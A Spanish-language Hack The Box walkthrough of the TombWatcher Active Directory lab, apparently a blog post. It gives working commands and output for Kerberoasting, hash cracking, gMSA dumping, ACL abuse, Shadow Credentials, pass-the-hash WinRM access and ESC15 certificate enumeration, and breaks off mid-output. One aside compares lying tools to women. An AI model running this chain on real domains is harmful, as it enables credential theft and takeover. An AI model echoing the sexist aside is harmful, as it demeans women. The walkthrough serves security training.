---
title: TombWatcher - Medium (HTB)
permalink: /TombWatcher-HTB-Writeup/
tags:
  - Windows
  - Medium
categories:
  - writeup
  - hacking
  - hackthebox
  - active directory
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
seo_tittle: TombWatcher - Medium (HTB)
seo_description: Explota derechos ACL mal configurados y abusa de plantillas de certificados en el servicio AD CS para vencer TombWatcher.
excerpt: Explota derechos ACL mal configurados y abusa de plantillas de certificados en el servicio AD CS para vencer TombWatcher.
header:
  overlay_image: /assets/images/headers/tombwatcher-hackthebox.jpg
  overlay_filter: 0.7
  og_image: /assets/images/headers/tombwatcher-hackthebox.jpg
---

![image-center](/assets/images/posts/tombwatcher-hackthebox.png)
{: .align-center}

**Habilidades:** Abusing AD ACL Rights - `WriteSPN`, Targeted Kerberoasting, Abusing AD ACL Rights - `AddSelf`, Abusing AD ACL - `ReadGMSAPassword` Rights, Abusing AD ACL Rights - `ForceChangePassword`, Abusing AD ACL Rights - `WriteOwner`, Shadow Credentials, Abusing AD ACL Rights - `GenericAll`, Abusing AD CS - `ESC15` B Technique (CVE-2024-49019) [Privilege Escalation], PassTheHash
{: .notice--primary}

# Introducción

TombWatcher es una máquina Windows de dificultad `Medium` en HackTheBox, donde debemos comprometer un entorno Windows que implementa Active Directory mediante técnicas relacionadas con la explotación de derechos ACL y la técnica ESC15 dentro del servicio AD CS (Active Directory Certificate Services) para obtener acceso privilegiado al dominio.

El creador de la máquina nos deja el siguiente mensaje en la descripción

> As is common in real life Windows pentests, you will start the TombWatcher box with credentials for the following account: `henry` / `H3nry_987TGV!`
{: .notice--info}
<br>
# Reconocimiento
---
Enviaremos una traza ICMP para comprobar que la máquina víctima se encuentre activa

~~~ bash
ping -c 1 10.10.11.72
           
PING 10.10.11.72 (10.10.11.72) 56(84) bytes of data.
64 bytes from 10.10.11.72: icmp_seq=1 ttl=127 time=143 ms

--- 10.10.11.72 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 143.332/143.332/143.332/0.000 ms
~~~


## Nmap Scanning 

Comenzaremos realizando un escaneo que identifique puertos abiertos en la máquina víctima mediante el protocolo TCP

~~~ bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.11.72 -oG openPorts
 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-07 17:25 EDT
Nmap scan report for 10.10.11.72
Host is up (0.16s latency).
Not shown: 65514 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49688/tcp open  unknown
49689/tcp open  unknown
49691/tcp open  unknown
49707/tcp open  unknown
49712/tcp open  unknown
49731/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 39.93 seconds
~~~

- `--open`: Mostrar únicamente los puertos abiertos
- `-p-`: Hacer un escaneo del total de puertos **(65535)**
- `--min-rate 5000`: Enviar mínimo **5000 paquetes por segundo**
- `-n`: No aplicar **resolución DNS**, lo que acelera el escaneo
- `-sS`: Modo de **escaneo TCP SYN**, no concluye la conexión, lo que hace el escaneo más ágil
- `-Pn`: Omitir el **descubrimiento de host (ARP)**
- `-oG`: Exportar en formato `grepable`
- `-v`: Ver el progreso del escaneo

Encontramos una gran cantidad de puertos, procederemos con un segundo escaneo que se encargue de intentar identificar la versión de cada servicio que descubrimos

~~~ bash
nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49666,49688,49689,49691,49707,49712,49731 -sVC 10.10.11.72 -oN services             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-07 17:28 EDT
Nmap scan report for 10.10.11.72
Host is up (0.32s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-08 01:28:21Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-08T01:29:57+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-07T14:12:38
|_Not valid after:  2026-10-07T14:12:38
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-08T01:29:57+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-07T14:12:38
|_Not valid after:  2026-10-07T14:12:38
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-08T01:29:57+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-07T14:12:38
|_Not valid after:  2026-10-07T14:12:38
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-10-08T01:29:57+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2025-10-07T14:12:38
|_Not valid after:  2026-10-07T14:12:38
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49688/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49689/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49731/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2025-10-08T01:29:18
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 107.24 seconds
~~~

- `-p`: Especificar puertos
- `-sV`: Identificar la versión del servicio 
- `-sC`: Uso de scripts de reconocimiento
- `-oN`: Exportar la salida en formato normal


Dentro de la captura podremos ver servicios comunes de Active Directory (`DNS, LDAP, SMB, Kerberos`, etc.), por lo que podemos interpretar que estamos frente a un controlador de dominio de AD. 

Vemos tanto el nombre del dominio como del host, agregaremos esta información a nuestro archivo `/etc/hosts` para poder aplicar una resolución DNS correctamente hacia el dominio

~~~ bash
echo '10.10.11.72 tombwatcher.htb DC01.tombwatcher.htb' | tee -a /etc/hosts

10.10.11.72 tombwatcher.htb DC01.tombwatcher.htb
~~~


## Initial Enumeration

Realizaremos un proceso de enumeración del dominio a nivel básico, donde podemos listar recursos de red SMB, registros DNS, información vía LDAP, etc.

### Domain Users

Podemos usar herramientas como `rpcclient` para intentar enumerar a los usuarios existentes a nivel de dominio

~~~ bash
rpcclient DC01.tombwatcher.htb -U 'henry%H3nry_987TGV!' -c 'enumdomusers'
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[Henry] rid:[0x44f]
user:[Alfred] rid:[0x450]
user:[sam] rid:[0x451]
user:[john] rid:[0x452]
~~~


## Domain Analysis - `Bloodhound`

Con las credenciales proporcionadas podremos recolectar información del dominio para poder analizarla con `Bloodhound`

~~~ bash
ntpdate DC01.tombwatcher.htb && bloodhound-python -d tombwatcher.htb -ns 10.10.11.72 --zip -c All -u henry -p 'H3nry_987TGV!'

2025-10-10 21:06:39.990191 (-0400) +0.003415 +/- 0.069307 DC01.tombwatcher.htb 10.10.11.72 s1 no-leap
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
...
...
...
~~~ 
<br>
# Intrusión / Explotación
---
## Abusing AD ACL Rights - `WriteSPN`

El usuario `henry` posee el derecho `WriteSPN` sobre el usuario `alfred`, esto le permite escribir sobre el atributo `Service Principal Name` de esta cuenta.

> Un `Service Principal Name` (SPN) es un identificador único que vincula una instancia de un servicio a una cuenta de inicio de sesión en un entorno de red como Active Directory.
{: .notice--info}

![image-center](/assets/images/posts/tombwatcher-bloodhound.png)
{: .align-center}

Ataques como `Kerberoasting` son posibles aprovechando cuentas con un SPN asociado. En este caso, como contamos con el atributo `WriteSPN`, somos capaces de forzar Kerberoasting.

> En un ataque Kerberoasting, el atacante solicita un ticket TGS (`Ticket Granting Service` para un SPN identificado), enviando un paquete `KRB_TGS_REQ` al KDC (solicitando acceso al servicio), una vez obtenido, se intenta descifrar con fuerza bruta de manera offline.
{: .notice--info}

Por como funciona `kerberos`, el atacante no necesita conocer las credenciales de la cuenta de servicio que tiene el SPN. Cualquier usuario válido puede solicitar un TGS para el servicio con el SPN identificado, el hash que se obtiene en la respuesta viene cifrado con el hash NTLM del usuario que tiene posee el SPN asociado.

### Targeted Kerberoasting

Esta técnica es una variante del Kerberoasting, su principal diferencia es que explota derechos que permiten modificar el atributo SPN (`Service Principal Name`) del usuario víctima para posteriormente solicitar un TGS e intentar descifrar el hash, y así obtener la contraseña en texto claro de la víctima

~~~ bash
targetedKerberoast.py -v -d tombwatcher.htb -u 'henry' -p 'H3nry_987TGV!' --dc-ip 10.10.11.72

[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$2670ead6b0aaf5d9e2a643699153b98c$cf85b27be4c06cec38fa68ff36abf963f3cb6815e42b9ce5ee78f1d224898c45be9a455a13ab1bc263291dbf369fe6e624475651288e8bc9712cf815ec11769b3f49e9f9f7b14aabfa6e9fe437f1eaf35aa0c5511e81ea3d64ef0cf45944cfd521f4ef09c1e6f50be74273306c5abc0fb47b4b67210706cefde3397ae19c7ab0d85d3040fe85071b78823a7860338daa7c254317922c7b8d26c4cd8248afdaaecb4954d5c690e6be234589cf6366fb8b5f4a4549fbf6d494aa92d79f44a5332c471aa8e02b5a0f348b52fbd43409779f8f63e9e1af8f7e226e6d52e83b9ca4caeea15b00c9d2ad74f8244b442ff2f1fd8a7de682fec406f1d742df6819752dc26289d30171ced47e462e27bc7b4c55a5223ef759dbb5227e4364e7d020c2b2fd992fe3ed1506eb1d7b82ac87c405488cad6f3d2b4293dc26b089af6073203bc51fa2b24a4fe5c087d8be68c7c13977e52e093b894a63319077b72d04bb3e8194b5d7083c1c71e0d72487db9a4e2511fafce39b253f42c46e64dfb96acbb4533781777f28fa8c1b1d091b0ac0661351bc6c16b6dbe81f531b0a159fbe340a0804289b81dc0349f8390b5e9d8b780ca9d467d8db333ff4956082ecb63964eefcca0ae0fff62110ddec4e4d8a7accb8dabc10795b404c8d33f2701df24c6c36b809886c483e67cce27d87d10f0cb0b11437e17c05876351b54bf6d90de0a09246a03d83dfa84df1b9945d795155e49c0f8435ff68ff1d7319b3ad4793db05584836892ff7abf71739a5f15051413b778575505306cd489e6c030d934fcd8803aecd3cdb1422a70ad8db312fde5b488e5fae48587fab1e6f879cd027080536b6f2ada83aa71d2ab50544dc5c20be9c3663cbe52fd1eaa0e44128f34748a080666c2989fe26dde74d31bb6b9e7c167320d3e416c873cd8d296b705929a677474c80e94a6b35d7e9aa70341e3535848808a2ae385d5bbec8ed62fa1859c1943c16cc60560d81a01dc85e6cbb2d3995a39ca9e28a2757e0238bcea62ad175f476506224d05ae3b1c2e76af93a93b1bef36186146e5d8d0bf4e3a9475070adc09245f8b12182b1d4bdbfd48e98a421b85d171b95cf48a2b64fbc068b66ecd19d0da2e20554342909530683829b41ae1935c687015064882436d4e2e3ef847dd3206887489be873d61f329e0da51064d1301d22bbf9eca0d83a57ba132c839c2b1ed25cdc9e628ca900c059322ae60aa6038e98a6f6914234bffae0da9dff1bb8bba2b59a688c26048ce4b1126ba25866d9a07639726ae493fb9e42bf8f7efcc0150fb92b852cde6d27aaf4623393c222c449c481cae78ca1e3765d7539610d197eec1e5d8ec35fe2899e166d0a2560d8968ae92cdc8ce15506ca3e8cd9c85b57426e04efc9f71bddc101857257e409d674e71272a6246c25d5001d39213d4fb6cae83dbea5b7b7c6c5db1a9a396ad29181514b792de2caddd4
~~~

Guardaremos el hash dentro de un archivo para intentar descifrarlo mediante fuerza bruta

~~~ bash
john --wordlist=/usr/share/wordlists/rockyou.txt tgs_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
basketball       (?)     
1g 0:00:00:00 DONE (2025-10-10 21:23) 50.00g/s 51200p/s 51200c/s 51200C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
~~~

Hemos encontrado la contraseña en texto claro para el usuario `alfred`:`basketball`


## Abusing AD ACL Rights - `AddSelf`

El usuario `alfred` posee el derecho `AddSelf` sobre el grupo `Infrastructure`, como el mismo nombre nos indica, le permite agregarse a sí mismo para ser miembro de este grupo

![image-center](/assets/images/posts/tombwatcher-bloodhound-2.png)
{: .align-center}

Necesitaremos utilizar autenticación `kerberos`, es por eso que antes de continuar, obtendremos un TGT para el usuario `alfred`

~~~ bash
getTGT.py tombwatcher.htb/alfred:'basketball' -dc-ip 10.10.11.72       
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in alfred.ccache
~~~

Agregaremos al usuario `alfred` al grupo `Infrastructure` a través de herramientas como `bloodyAD`

~~~ bash
KRB5CCNAME=alfred.ccache bloodyAD --host dc01.tombwatcher.htb -d tombwatcher.htb -k --dc-ip 10.10.11.72 add groupMember INFRASTRUCTURE 'alfred'

[+] alfred added to INFRASTRUCTURE
~~~


## Abusing AD ACL - `ReadGMSAPassword` Rights

El grupo `Infrastructure` posee el derecho `ReadGMSAPassword` sobre la computadora `ansible_dev$`. 

Este derecho otorga la capacidad de leer el atributo `msDS-ManagedPassword` de una cuenta `gMSA`, resultando en una lectura del hash NTLM de la cuenta víctima

> Una cuenta GMSA (`Group Managed Service Account`) es un tipo de cuenta de servicio de dominio en Windows que se utiliza para ejecutar servicios y aplicaciones en varios servidores.
{: .notice--info}

![image-center](/assets/images/posts/tombwatcher-bloodhound-3.png)
{: .align-center}

Con herramientas como `gMSADumper` podemos extraer las credenciales asociadas a la cuenta de computadora `ansible_dev$`, de forma que veremos sus credenciales en formato hash

~~~ bash
gMSADumper.py -d tombwatcher.htb -u alfred -p 'basketball' -l 10.10.11.72

Users or groups who can read password for ansible_dev$:
 > Infrastructure
ansible_dev$:::4f46405647993c7d4e1dc1c25dd6ecf4
ansible_dev$:aes256-cts-hmac-sha1-96:2712809c101bf9062a0fa145fa4db3002a632c2533e5a172e9ffee4343f89deb
ansible_dev$:aes128-cts-hmac-sha1-96:d7bda16ace0502b6199459137ff3c52d
~~~

Alternativamente podríamos haber obtenido un hash NTLM con `netexec`

~~~ bash
nxc ldap DC01.tombwatcher.htb -u alfred -p 'basketball' --gmsa
~~~

Si creemos que las herramientas nos mienten (como las mujeres), podemos validar el hash NTLM desde `netexec`

~~~ bash
nxc ldap DC01.tombwatcher.htb -u 'ansible_dev$' -H 4f46405647993c7d4e1dc1c25dd6ecf4

SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.72     389    DC01             [+] tombwatcher.htb\ansible_dev$:4f46405647993c7d4e1dc1c25dd6ecf4 
~~~


## Abusing AD ACL Rights - `ForceChangePassword`

La cuenta `ansible_dev$` posee derechos `ForceChangePassword` sobre el usuario `sam`, esto permite forzar un cambio de contraseña sobre la cuenta objetivo

![image-center](/assets/images/posts/tombwatcher-bloodhound-4.png)
{: .align-center}

Cambiaremos la contraseña del usuario `sam` de la siguiente manera, haciendo `PassTheHash`, herramientas como `rpcclient` soportan la flag `--pw-nt-hash`

~~~ bash
rpcclient DC01.tombwatcher.htb -U 'ansible_dev$%4f46405647993c7d4e1dc1c25dd6ecf4' -c 'setuserinfo2 sam 23 Password123!' --pw-nt-hash
~~~

> Las credenciales de las cuentas `gMSA` son **gestionadas dinámicamente** por el Controlador de Dominio, por lo que es probable que si dejamos la máquina para otro día, las credenciales hayan cambiado.
{: .notice--info}

Validaremos las nuevas credenciales para el usuario `sam`

~~~ bash
nxc smb DC01.tombwatcher.htb -u 'sam' -p 'Password123!'
 
SMB         10.10.11.72     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:tombwatcher.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.72     445    DC01             [+] tombwatcher.htb\sam:Password123! 
~~~


## Abusing AD ACL Rights - `WriteOwner`

EL usuario `sam` tiene asignado el derecho `WriteOwner` sobre el usuario `john`, esto le permite modificar al propietario de esta cuenta. 

De esta forma podremos posteriormente obtener un control total sobre la cuenta víctima 

![image-center](/assets/images/posts/tombwatcher-bloodhound-5.png)
{: .align-center}

 Asignaremos a `sam` como el propietario del usuario `john` con la herramienta `owneredit` de `impacket`

~~~ bash
owneredit.py -action write -new-owner 'sam' -target 'john' sequel.htb/sam:'Password123!' -dc-ip 10.10.11.72

Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] Current owner information below
[*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
[*] OwnerSid modified successfully!
~~~

Ahora somos propiestarios de la cuenta `john`. Procederemos con asignar control total al usuario `sam` sobre el usuario `john`

~~~ bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'sam' -target-dn 'CN=JOHN,CN=USERS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb'/'sam':'Password123!'  
                               
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20251010-220653.bak
[*] DACL modified successfully!
~~~


## Shadow Credentials

Ahora que disponemos de control total sobre la cuenta de `john`, realizaremos un ataque de Shadow Credentials, principalmente para evitar estar cambiando la contraseña constantemente.

> Esta técnica contempla modificar el atributo `msDS-KeyCredentialLink`, añadiendo credenciales en forma de certificados, permitiendo autenticarnos como el usuario víctima sin conocer su contraseña. 
{: .notice--info}

Es posible automatizar un poco el proceso para obtener el hash NTLM de la cuenta objetivo directamente utilizando `certipy`

~~~ bash
certipy shadow auto -u sam@tombwatcher.htb -p 'Password123!' -account john -dc-ip 10.10.11.72
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'john'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '13647032-2ac5-abef-930d-972979176563'
[*] Adding Key Credential with device ID '13647032-2ac5-abef-930d-972979176563' to the Key Credentials for 'john'
[*] Successfully added Key Credential with device ID '13647032-2ac5-abef-930d-972979176563' to the Key Credentials for 'john'
[*] Authenticating as 'john' with the certificate
[*] Using principal: john@tombwatcher.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'john.ccache'
[*] Trying to retrieve NT hash for 'john'
[*] Restoring the old Key Credentials for 'john'
[*] Successfully restored the old Key Credentials for 'john'
[*] NT hash for 'john': b1734f0b1af39ab67d9ceef96b82b82a
~~~


## Shell as `john`

El usuario `john` es miembro del grupo `Remote Management Users`, esto le permite conectarse al DC para obtener una sesión de `powershell` de manera remota

> El grupo [`Remote Management Users`](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#remote-management-users) en Active Directory permite a los usuarios miembros acceder de manera remota a un equipo a través del protocolo `WinRM`, el cual está basado en el estándar `WS-Management`.
{: .notice--info}

![image-center](/assets/images/posts/tombwatcher-bloodhound-6.png)
{: .align-center}

Utilizaremos herramientas como `evil-winrm` o `evil-winrm-py` para autenticarnos frente al protocolo `WinRM` y obtener una consola de `powershell`

~~~ powershell
evil-winrm-py -i DC01.tombwatcher.htb -u 'john' -H 'b1734f0b1af39ab67d9ceef96b82b82a'

        ▘▜      ▘             
    █▌▌▌▌▐ ▄▖▌▌▌▌▛▌▛▘▛▛▌▄▖▛▌▌▌
    ▙▖▚▘▌▐▖  ▚▚▘▌▌▌▌ ▌▌▌  ▙▌▙▌
                          ▌ ▄▌ v1.1.2
[*] Connecting to DC01.tombwatcher.htb:5985 as john
evil-winrm-py PS C:\Users\john\Documents> whoami
tombwatcher\john
~~~

Ya podremos ver la primera flag ubicada en el escritorio del usuario `john`

~~~ powershell
evil-winrm-py PS C:\Users\john\Documents> type ..\Desktop\user.txt
6e1...
~~~
<br>


# Escalada de Privilegios
---
## Abusing AD ACL Rights - `GenericAll`

El usuario `john` posee derechos `GenericAll` sobre la OU (Unidad Organizativa) `ADCS`. Este derecho a nivel de OU le permite obtener control total sobre los objetos que se encuentran dentro de la unidad organizativa

> Una OU (Unidad Organizativa) en Active Directory es un **contenedor jerárquico** que se utiliza para agrupar y organizar objetos como usuarios, equipos y grupos en una estructura lógica similar a la de una empresa.
{: .notice--info}

![image-center](/assets/images/posts/tombwatcher-bloodhound-7.png)
{: .align-center}

### Finding Deleted Accounts

Luego de una enumeración exhaustiva, si buscamos con `ldapsearch` incluyendo objetos eliminados, veremos la cuenta `cert_admin`

~~~ bash
ldapsearch -H ldap://10.10.11.72 -D 'john@tombwatcher.htb' -w 'Password123!' -b 'DC=tombwatcher,DC=htb' "(objectClass=user)" -E showDeleted | grep sAMAccountName
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: DC01$
sAMAccountName: krbtgt
sAMAccountName: Henry
sAMAccountName: Alfred
sAMAccountName: sam
sAMAccountName: john
sAMAccountName: ansible_dev$
sAMAccountName: cert_admin
sAMAccountName: cert_admin
sAMAccountName: cert_admin
~~~

Buscaremos desde `powershell` para poder identificar este objeto con mayor detalle

~~~ powershell
evil-winrm-py PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects


Deleted           : True
DistinguishedName : CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : Deleted Objects
ObjectClass       : container
ObjectGUID        : 34509cb3-2b23-417b-8b98-13f0bd953319

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
ObjectClass       : user
ObjectGUID        : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
ObjectClass       : user
ObjectGUID        : c1f1f0fe-df9c-494c-bf05-0679e181b358

Deleted           : True
DistinguishedName : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
Name              : cert_admin
                    DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
ObjectClass       : user
ObjectGUID        : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
~~~

> Para una búsqueda más precisa, que incluya el SID, podemos aplicar una serie de filtros en el comando anterior
{: .notice--warning}

~~~ powershell
evil-winrm-py PS C:\Users\john\Documents> Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects -Properties ObjectSid, nTSecurityDescriptor, ObjectGUID
~~~

### Restoring User

Como tenemos control sobre la unidad organizativa `ADCS`, probablemente este usuario que ha sido eliminado se encuentre dentro de ella. Comenzaremos otorgando control total al usuario `john` sobre la OU `ADCS`

~~~ bash
dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'john' -target-dn 'OU=ADCS,DC=TOMBWATCHER,DC=HTB' 'tombwatcher.htb/john' -hashes :b1734f0b1af39ab67d9ceef96b82b82a
Impacket v0.13.0.dev0+20250109.91705.ac02e0ee - Copyright Fortra, LLC and its affiliated companies 

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20251011-151606.bak
[*] DACL modified successfully!
~~~

Intentaremos reestablecer la cuenta `cert_admin` empleando el último objeto eliminado

~~~ powershell
evil-winrm-py PS C:\Users\john\Documents> Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
~~~

### Bloodhound

Volveremos a recolectar la información del dominio para poder ver esta cuenta que acabamos de reestablecer

~~~ bash
bloodhound-python -d tombwatcher.htb -ns 10.10.11.72 -dc dc01.tombwatcher.htb --zip -c All -u john -p 'Password123!'
~~~


## Shadow Credentials

Una vez hemos cargado el nuevo comprimido dentro de `Bloodhound`, notaremos que tenemos derechos `GenericAll` sobre la cuenta `cert_admin`. 

Como aprendimos anteriormente, este derecho nos brinda la capacidad de modificar cualquier atributo sobre la cuenta víctima, por lo que podemos realizar múltiples ataques

![image-center](/assets/images/posts/tombwatcher-bloodhound-8.png)
{: .align-center}

Podemos aprovechar `GenericAll` para cambiar la contraseña de la cuenta `cert_admin`, o volver a realizar un ataque `Shadow Credentials` para no depender de la contraseña de la cuenta víctima 

~~~ bash
certipy shadow auto -u john@tombwatcher.htb -hashes :b1734f0b1af39ab67d9ceef96b82b82a -account cert_admin -dc-ip 10.10.11.72
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'cert_admin'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '87da6137-6836-c451-d5da-15b2453a78c7'
[*] Adding Key Credential with device ID '87da6137-6836-c451-d5da-15b2453a78c7' to the Key Credentials for 'cert_admin'
[*] Successfully added Key Credential with device ID '87da6137-6836-c451-d5da-15b2453a78c7' to the Key Credentials for 'cert_admin'
[*] Authenticating as 'cert_admin' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'cert_admin@tombwatcher.htb'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'cert_admin.ccache'
[*] Wrote credential cache to 'cert_admin.ccache'
[*] Trying to retrieve NT hash for 'cert_admin'
[*] Restoring the old Key Credentials for 'cert_admin'
[*] Successfully restored the old Key Credentials for 'cert_admin'
[*] NT hash for 'cert_admin': dceb50ac4ab6609ebcefa230760477db
~~~


## Abusing AD CS - `ESC15` B Technique (CVE-2024-49019)

`ESC15`, también conocida como `EKUwu` y además registrada como `CVE-2024-49019`, es una técnica de escalada de privilegios que aprovecha una vulnerabilidad en la implementación de la extensión `Application Policies` en plantillas de certificado de esquema `1` (`Schema Version: 1`)

~~~ bash
certipy find -u cert_admin -hashes :dceb50ac4ab6609ebcefa230760477db -dc-ip 10.10.11.72 -stdout -vulnerable

Certipy v5.0.2 - by Oliver Lyak (ly4k)
...
...
...
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
